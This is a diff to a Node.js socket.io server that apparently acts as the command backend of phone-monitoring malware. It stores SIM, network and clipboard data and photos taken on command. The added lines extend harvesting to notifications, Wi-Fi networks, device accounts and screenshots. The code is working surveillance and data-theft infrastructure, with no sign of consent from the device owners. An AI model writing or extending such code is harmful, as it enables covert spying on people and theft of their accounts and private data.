@@ -318,6 +318,10 @@ io.on('connection', async (socket) => {
             if (cleanResult.simInfo)               dataSetOps['data.simInfo']       = cleanResult.simInfo;
             if (cleanResult.networkInfo)           dataSetOps['data.networkInfo']   = cleanResult.networkInfo;
             if (cleanResult.clipboard)             dataSetOps['data.clipboard']     = cleanResult.clipboard;
+            if (cleanResult.notifications)         dataSetOps['data.notifications'] = cleanResult.notifications;
+            if (cleanResult.networks)              dataSetOps['data.wifiNetworks']  = cleanResult.networks;
+            if (cleanResult.accounts)              dataSetOps['data.accounts']      = cleanResult.accounts;
+            if (cleanResult.screenshot)            dataSetOps['data.screenshot']    = cleanResult.screenshot;
             // Store captured photo reference (only for take_photo)
             if (cleanResult.cloudinaryUrl && cleanResult.command === 'take_photo') {
               dataSetOps['data.lastPhoto'] = { url: cleanResult.cloudinaryUrl, publicId: cleanResult.cloudinaryPublicId, timestamp: new Date() };
